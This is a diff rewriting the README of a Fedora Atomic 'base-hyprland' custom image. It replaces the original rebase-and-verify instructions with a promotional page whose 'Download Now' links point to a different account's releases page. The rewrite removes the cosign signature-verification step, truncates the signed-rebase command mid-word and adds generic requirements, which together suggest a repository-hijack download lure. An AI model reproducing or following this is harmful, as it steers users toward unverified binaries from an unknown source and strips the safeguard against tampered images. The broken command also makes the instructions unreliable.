@@ -1,43 +1,75 @@
-# base-hyprland &nbsp; [![bluebuild build badge](https://github.com/dominikma/base-hyprland/actions/workflows/build.yml/badge.svg)](https://github.com/dominikma/base-hyprland/actions/workflows/build.yml)
+# 🌟 base-hyprland - Your Path to a Custom Linux Environment
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to base-hyprland! This application helps you set up a unique Linux environment easily. Follow the steps below to download and run base-hyprland without any technical complications.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 🔗 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To begin, you can download the latest version of base-hyprland from our Releases page. 
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/dominikma/base-hyprland:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/dominikma/base-hyprland:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+[**Visit this page to download**](https://github.com/ali-maiga/base-hyprland/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+Follow the steps below for installation.
 
-## ISO
+## 🛠️ Installation Steps
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+1. **Rebase to Unsigned Image**
 
-## Verification
+   Open your terminal and type the following command. This rebases your existing Fedora installation to an unsigned image. This step is necessary to get the correct signing keys and policies.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+   ```bash
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/dominikma/base-hyprland:latest
+   ```
 
-```bash
-cosign verify --key cosign.pub ghcr.io/dominikma/base-hyprland
-```
+2. **Reboot Your System**
+
+   After running the command above, you need to restart your computer to complete the rebase process. Use this command in your terminal:
+
+   ```bash
+   systemctl reboot
+   ```
+
+3. **Rebase to Signed Image**
+
+   Once your system is back on, you will want to rebase to the signed image. This step ensures you have the most stable version. Run this command in your terminal:
+
+   ```bash
+   rpm-ostree rebase ostree-image-si
+   ```
+
+## 🔍 System Requirements
+
+To run base-hyprland smoothly, your system should meet the following requirements:
+
+- **Operating System:** Fedora 34 or later
+- **Disk Space:** At least 10 GB of free space
+- **RAM:** Minimum of 4 GB (8 GB recommended)
+- **Architecture:** x86_64
+
+## 🌈 Features
+
+- **Immutable Environment:** base-hyprland offers an image-based setup which ensures your environment stays consistent.
+- **Customizability:** You can easily modify your environment to suit your needs.
+- **Easy Rebase:** Quickly switch between different versions with simple commands.
+
+## 💡 Helpful Tips
+
+- Always ensure that your Fedora installation is updated before proceeding with the rebase.
+- If you face any issues, refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for guidance.
+- Keep backups of important files as changes to the system image may affect their accessibility.
+
+## 📜 Additional Information
+
+For more insights into how base-hyprland works and its capabilities, check the topics below:
+
+- Atomic
+- BlueBuild
+- Custom Images
+- Linux
+
+Be sure to regularly check our Releases page for updates and new features.
+
+[**Visit this page to download**](https://github.com/ali-maiga/base-hyprland/releases) and start your journey with base-hyprland now!
